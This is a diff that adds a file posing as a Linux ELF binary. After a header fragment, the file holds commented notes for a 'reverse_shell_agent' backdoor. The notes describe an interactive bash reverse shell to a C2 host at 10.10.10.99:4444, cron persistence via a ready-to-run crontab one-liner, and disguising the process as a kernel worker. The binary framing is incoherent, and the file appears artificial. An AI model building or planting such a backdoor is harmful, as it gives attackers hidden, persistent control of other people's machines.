@@ -1,0 +1,23 @@
+ELF                                       (  @8   @       @       @       88  8                  TT @T @                                                    
+# -----------------------------------------------
+# [BACKDOOR] reverse_shell_agent v0.3
+# Compiled: 2026-03-18 | Target: Linux x86_64
+# C2 Server: 10.10.10.99:4444
+# -----------------------------------------------
+# [FUNC] connect_reverse_shell()
+#   -> socket(AF_INET, SOCK_STREAM)
+#   -> connect(10.10.10.99, 4444)
+#   -> dup2(sockfd, STDIN/STDOUT/STDERR)
+#   -> execve("/bin/bash", ["/bin/bash", "-i"])
+#
+# [FUNC] persist()
+#   -> crontab -l | echo "* * * * * /tmp/bd" | crontab -
+#
+# [FUNC] hide_process()
+#   -> prctl(PR_SET_NAME, "kworker/0:1")
+#
+# .rodata section:
+SHELL=/bin/bash
+C2_HOST=10.10.10.99
+C2_PORT=4444
+PROC_MASK=kworker/0:1
